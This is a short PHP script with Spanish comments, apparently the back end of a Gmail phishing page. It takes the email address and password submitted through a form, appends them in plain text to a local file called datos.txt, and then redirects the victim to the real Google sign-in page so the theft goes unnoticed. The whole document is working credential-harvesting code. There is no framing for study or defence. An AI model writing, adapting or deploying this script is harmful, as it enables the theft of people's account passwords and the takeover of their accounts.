<?php
// Verificar si los datos fueron enviados por POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Verificar si se recibió el correo electrónico y la contraseña
    if (isset($_POST['email']) && isset($_POST['password'])) {
        // Obtener los datos del formulario
        $email = $_POST['email'];
        $password = $_POST['password'];

        // Formato del texto a guardar en el archivo
        $data = "Correo: " . $email . " | Contraseña: " . $password . "\n";

        // Guardar los datos en un archivo de texto
        if (file_put_contents("datos.txt", $data, FILE_APPEND)) {
            // Redirigir a la página real de Gmail después de capturar los datos
            header("Location: https://accounts.google.com/signin");
            exit();
        } else {
            echo "Hubo un problema al guardar los datos. Por favor, inténtalo nuevamente.";
        }
    } else {
        echo "Datos incompletos. Por favor, ingresa todos los campos.";
    }
} else {
    echo "Acceso no permitido.";
}
?>
